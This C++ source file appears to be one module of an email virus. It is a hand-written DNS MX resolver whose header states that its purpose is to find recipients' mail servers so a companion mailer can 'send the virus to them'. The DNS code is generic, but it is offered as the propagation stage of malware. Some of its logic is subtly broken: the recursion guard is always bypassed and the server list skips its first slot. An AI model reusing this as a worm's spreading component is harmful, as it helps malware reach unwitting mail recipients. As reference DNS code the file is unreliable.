/****************************************************
* Originally written in December 03
* 
* Purpose:
* Manually queries the users DNS server
* and looksup the MX record of the recipient's
* address. Then, mailer.cpp takes the MX server
* address and looks up the IP address of the server
* and uses sendmail function to send the virus to them
*
*
*****************************************************/

#define ERROR_LEVEL_NONE 0
#define ERROR_LEVEL_SEND 1
#define ERROR_LEVEL_RECEIVE 2


SOCKET hServer;
WSADATA wsData;
int ErrorLevel = ERROR_LEVEL_NONE;

/* Structures to hold DNS information */

typedef struct DNS_HEAD {
	WORD wIdentification;
	WORD wFlags;
	WORD wNumberOfQuestions;
	WORD wNumberOfAnswers;
	WORD wNumberOfAuthority;
	WORD wNumberOfAdditional;
} * PDNSH, DNSH;

typedef struct DNS_QUESTION {
	char sQuestion[256];
	WORD wType;
	WORD wClass;
} * PDNSQ, DNSQ;

typedef struct DNS_RFIXED {
	WORD wType;
	WORD wClass;
	DWORD dwTTL;
	WORD wDataLength;
} * PDNSR, DNSR;

typedef struct DNS_RESOURCE {
	char sName[256];
	DNSR dnsFixed;
	WORD wPreferenceMX;
	char sHostname[256];

} * PDNSRR, DNSRR;

typedef struct MX_REPLY {

	DWORD	dwNumReplies;
	PDNSRR	mxReplies;

} MX, * PMX, FAR * LPMX;



#define DNS_HEADER_LEN		12
#define DNS_QUESTION_LEN	260
#define DNS_RFIXED_LEN		10
#define DNS_RESOURCE_LEN	522
#define DNS_MAX_QUESTION	275


WORD MxGetID(WORD wAdd) {

	static WORD wID = LOWORD(GetCurrentThreadId());
	return (wID + wAdd);
}
// Makes the MX record query which is sent to the server
char* MxFormQuery(LPCSTR szQuery, WORD* pwSize) {

	WORD wHead[]= {htons(MxGetID(0)),0,0x0100,0,0,0};
	static char cBuffer[DNS_MAX_QUESTION];
	
	memset((void*) cBuffer, 0, DNS_MAX_QUESTION);
	memcpy((void*) cBuffer, (void*) wHead, 12);

	int i = 0, p = 0;
	int s = strlen(szQuery)+1;
	int max = 12 + s + 5;

	if (pwSize)
		*pwSize = (WORD) max;
//begin formulating server query

	for(i=0;i<=s;i++) {
		if (i==s) {
			cBuffer[p+12] = i-p-1;
			DWORD dwX = 0x01000F00;
			memcpy((void*) &cBuffer[12+1+i], (void*) &dwX, 4);
		} else if (szQuery[i]=='.') {
			cBuffer[p+12] = i-p;
			p = i+1;
		} else {
			cBuffer[12+1+i] = szQuery[i];
		}
	}

	return cBuffer;
}

//read in dns name and MX server
int MxReadName(const char* szDNS, int iOffset, char* szBuffer) {

	if (!szDNS) return 0;

	WORD wOctPtr = 0;
	signed int i = 0;
	BYTE c = NULL;
	
	for (i=iOffset;szDNS[i];i++) {
		int j = i - iOffset - 1;

		if (!c) 
		{
			c = szDNS[i];
			if (j!=(-1)) szBuffer[j] = '.';

			if (c & 0xC0) {
				
				c = c & 0x3F;
				wOctPtr = c;
				wOctPtr <<= 8;
				c = szDNS[++i];
				wOctPtr |= c;

				return MxReadName(szDNS,wOctPtr,&szBuffer[j+1])?(i+1):0;
			}
			
		} else {
			szBuffer[j] = szDNS[i];
			c--;
		}
	}

	szBuffer[i++] = 0;
	return i;
}

int MxGetQuestion(const char* szDNS, PDNSQ pQuestion) {

	DNSQ dns = {0};
	int iOff = DNS_HEADER_LEN;

	if (int i = MxReadName(szDNS,iOff,dns.sQuestion)) {
		dns.wType = htons(*((WORD*) &szDNS[i]));
		dns.wClass = htons(*((WORD*) &szDNS[i+2]));
		if (pQuestion) memcpy((void*) pQuestion,
			(void*) &dns, DNS_QUESTION_LEN);
		return (i+4);
	} else {
		return 0;
	}
}

int MxGetRes(const char* szDNS, int iOff, PDNSRR pDns) {

	DNSRR dns = {0};
	signed int i = 0;
	signed int iRet = 0;
	if (i = MxReadName(szDNS,iOff,dns.sName)) 
	{
		memcpy((void*) &dns.dnsFixed, (void*) &szDNS[i],
			DNS_RFIXED_LEN);

		dns.dnsFixed.dwTTL			= htonl(dns.dnsFixed.dwTTL);
		dns.dnsFixed.wClass			= htons(dns.dnsFixed.wClass);
		dns.dnsFixed.wDataLength	= htons(dns.dnsFixed.wDataLength);
		dns.dnsFixed.wType			= htons(dns.dnsFixed.wType);

		i += DNS_RFIXED_LEN;
		iRet=i+dns.dnsFixed.wDataLength;
		switch(dns.dnsFixed.wType) {

		case 2:
			iRet = MxReadName(szDNS, i, dns.sHostname);
			break;

		case 15:

			dns.wPreferenceMX =  * ((WORD*) &szDNS[i]);
			dns.wPreferenceMX = htons(dns.wPreferenceMX);
			iRet = MxReadName(szDNS, i+2, dns.sHostname);
			break;

		default:

			break;
		}

		if (pDns && i) memcpy((void*) pDns, (void*) &dns, 
			DNS_RESOURCE_LEN);
		
	} 
	return iRet;
}


PDNSRR MxGetResources(const char* szDNS, int num) {

	PDNSRR pDnsRR = NULL;
	int iOff = MxGetQuestion(szDNS,NULL);

	if (!szDNS) {
		return NULL;
	} else if (!(pDnsRR = new DNSRR[num])) {
		return NULL;
	}

	PDNSRR pPoint = pDnsRR;

	for (int i = 0; i < num; i++) {
		if (!(iOff = MxGetRes(szDNS,iOff,pPoint))) {
			delete[] pDnsRR;
			return NULL;
		} 
		pPoint = &pDnsRR[i+1];
	}
	return pDnsRR;
}

DWORD GetIPAddr(LPCSTR strHost) {
	HOSTENT* hp = gethostbyname(strHost);
	return hp?(((PIN_ADDR)hp->h_addr)->S_un.S_addr):0;
}
// checks if the address is really a valid ip address
bool IsIPAddr(LPCSTR sHost) {
	if (!sHost) return false;
	if (strlen(sHost)>15) return false;

	for (int ptr=0;ptr<=3;sHost++) {
		if (!*sHost) return true;
		if (*sHost=='.') { ptr++; continue;}
		if (!isdigit(*sHost)) return false;
	}

	return false;
}
//is it a digit? 0-9
bool IsDigit(LPCSTR sVal) {
	do { if (!isdigit(*sVal)) return false; }
	while (*++sVal);
	return true;
}

//pauses WSA to get response
bool WSAWait(HANDLE hEvent, int iTimeout) {

	int iRet = WSAGetLastError();

	if (!iRet) {
		ResetEvent(hEvent);
		return true;
	}

	else if (iRet==WSAEWOULDBLOCK) {
		if (WaitForSingleObject(hEvent,iTimeout)) {
			return false;
		} else if (!ResetEvent(hEvent)) {
			return false;
		} else {
			return true;
		}
	} else {
		return false;
	}
}
//Recursively searches the server for the MX record
MX MxRecursiveGet(LPCSTR sRequest, DWORD dwServerIP, int iTimeout) {

	static DWORD ips[200];
	static DWORD ipc;

	static WSADATA wsa = {0};
	bool bInitiator = false;

	MX mxReturn = {0};

			bInitiator = true;
			ipc = 0;
	
	if (!bInitiator) {

		for (DWORD i = 0; i < ipc; i++) {
			if (dwServerIP == ips[i]) 
				return mxReturn;
		}

		if (ipc >= 199) return mxReturn;
		else ips[++ipc] = dwServerIP;

	}

		signed int i = 0, jmp = 0;
		SOCKADDR_IN sAddr = {0};
		SOCKET s = INVALID_SOCKET;
		DWORD dwZero = NULL;

		DNSH dnsHead = {0};
		DNSQ dnsQu = {0};
		HANDLE hEvent = NULL;

		char *szQuery=NULL, *szReply=NULL;
		WORD wQuery=0, wReply=0, wQ = 0;

		if (!(szQuery = MxFormQuery(sRequest, &wQuery))) 
			goto end_get;

		else wQ = htons(wQuery);
		
		sAddr.sin_addr.S_un.S_addr = dwServerIP;
		sAddr.sin_family = AF_INET;
		sAddr.sin_port = htons(53);



		if ((s = socket(PF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) 
			goto end_get;


		if (!(hEvent = CreateEvent(NULL,TRUE,FALSE,NULL)))
			goto end_get;
		
		if (WSAEventSelect(s,hEvent,FD_CONNECT) == SOCKET_ERROR) 
			goto end_get;

		i = connect(s,(PSOCKADDR) &sAddr, sizeof(sAddr)); //lets connect to the server :)
		if ((i==SOCKET_ERROR)&&WSAGetLastError()!=WSAEWOULDBLOCK) 
			goto end_get;

		if (WaitForSingleObject(hEvent,iTimeout))
			goto end_get;

		if ((WSAEventSelect(s,hEvent,NULL)==SOCKET_ERROR) ||
		    (ioctlsocket(s,FIONBIO,&dwZero)==SOCKET_ERROR ))
		{
			goto end_get;
		}

		if (!ResetEvent(hEvent)) {
			goto end_get;
		} 

		if (send(s,(LPCSTR) &wQ, 2, 0) != 2)
			goto end_get;
		if (send(s,(LPCSTR) szQuery, wQuery, 0) != wQuery)
			goto end_get;

	
		if (WSAEventSelect(s,hEvent,FD_READ) == SOCKET_ERROR) 
			goto end_get;

		if (recv(s,(char*)&wReply,2,0)!=2) {
			if (WSAWait(hEvent,iTimeout)) {
				if (recv(s,(char*)&wReply,2,0)!=2) {
					goto end_get;
		} } } 


		wReply = htons(wReply);

		if (!(szReply=(char*)malloc(wReply))) 
			goto end_get;		

		if (recv(s,szReply,wReply,0)!=wReply) {
			if (WSAWait(hEvent,iTimeout)) {
				if (recv(s,szReply,wReply,0)!=wReply) {
					goto end_get;
		} } } 

		CloseHandle(hEvent);
		closesocket(s);
		s = INVALID_SOCKET;
		
		for (i = 0; i < sizeof(dnsHead); i+=2) {
			char cTemp = szReply[i];
			szReply[i] = szReply[i+1];
			szReply[i+1] = cTemp;
		}

		memcpy((void*) &dnsHead, (void*) szReply, 
			DNS_HEADER_LEN);

		if (dnsHead.wIdentification == MxGetID(0)) {
				
			if (dnsHead.wNumberOfAnswers) {


				if (mxReturn.mxReplies = MxGetResources(szReply,
					dnsHead.wNumberOfAnswers))
				{
					mxReturn.dwNumReplies = dnsHead.wNumberOfAnswers;
				}

				goto end_get;
			}

			else if (dnsHead.wNumberOfAuthority) {

				if (PDNSRR dnsRes = MxGetResources(szReply,
					dnsHead.wNumberOfAuthority))
				{
					free(szReply);
					szReply = NULL;

					for (i=0;(i<dnsHead.wNumberOfAuthority)&&(!mxReturn.mxReplies);i++) {
						if ((dnsRes[i].dnsFixed.wType == 2) && // Authority Nameserver
							(dnsRes[i].dnsFixed.wClass== 1)) // Internet
						{
							DWORD dwConnect = GetIPAddr(dnsRes[i].sHostname);
							if (dwConnect) mxReturn = MxRecursiveGet(
								sRequest,dwConnect,iTimeout);
						}
					}

					delete[] dnsRes; //deallocate memory space
				}

			}
		}

end_get:
		if (s != INVALID_SOCKET) closesocket(s);
		if (szReply) free(szReply);
return mxReturn;
	}

//Clears the buffer (in the structure)
void MxClearBuffer(PMX m) {
	if (m->mxReplies) delete[] m->mxReplies;
	memset((void*) m, 0, sizeof(MX));
}
